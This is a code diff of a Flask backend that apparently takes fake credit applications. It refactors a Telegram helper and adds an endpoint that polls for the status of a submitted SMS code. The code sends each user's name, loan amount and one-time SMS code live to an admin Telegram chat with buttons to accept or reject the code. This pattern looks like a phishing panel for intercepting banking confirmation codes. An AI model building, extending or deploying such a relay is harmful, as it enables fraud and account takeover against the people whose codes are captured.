@@ -64,14 +64,14 @@ def tg(method, payload):
     except Exception as e:
         print("Telegram error:", e)
 
-def send_admin(text, keyboard=None):
+def send_admin(text, reply_markup=None):
     payload = {
         "chat_id": ADMIN_CHAT_ID,
         "text": text,
         "parse_mode": "HTML"
     }
-    if keyboard:
-        payload["reply_markup"] = keyboard
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
     tg("sendMessage", payload)
 
 def send_user(chat_id, text):
@@ -164,14 +164,15 @@ def submit_sms_code():
     row = db_one("SELECT fullname, amount FROM applications WHERE session_id = ?", (session_id,))
     if row:
         fullname, amount = row
-        send_admin(f"""
+        text = f"""
 🔐 ПОЛЬЗОВАТЕЛЬ ВВЕЛ SMS КОД
 
 🆔 Сессия: {session_id}
 👤 Клиент: {fullname}
 💰 Сумма: {amount:.0f} BYN
 📱 Код: {code}
-        """, reply_markup=code_keyboard(session_id))
+        """
+        send_admin(text, reply_markup=code_keyboard(session_id))
     return jsonify({"status": "ok"})
 
 @app.route("/submit_credit_application", methods=["POST"])
@@ -202,7 +203,7 @@ def submit_credit_application():
 📊 КИ: {credit_history}
 
 🆔 Сессия: {session_id}"""
-    send_admin(text, keyboard(session_id))
+    send_admin(text, reply_markup=keyboard(session_id))
     return jsonify({"status": "ok", "session_id": session_id})
 
 @app.route("/check_status/<session_id>")
@@ -210,6 +211,13 @@ def check_status(session_id):
     row = db_one("SELECT status FROM applications WHERE session_id = ?", (session_id,))
     if not row:
         return jsonify({"status": "not_found"}), 404
+    return jsonify({"status": row[0]})
+
+@app.route("/check_code_status/<session_id>")
+def check_code_status(session_id):
+    row = db_one("SELECT code_status FROM applications WHERE session_id = ?", (session_id,))
+    if not row:
+        return jsonify({"status": "pending"})
     return jsonify({"status": row[0]})
 
 @app.route("/webhook", methods=["POST"])
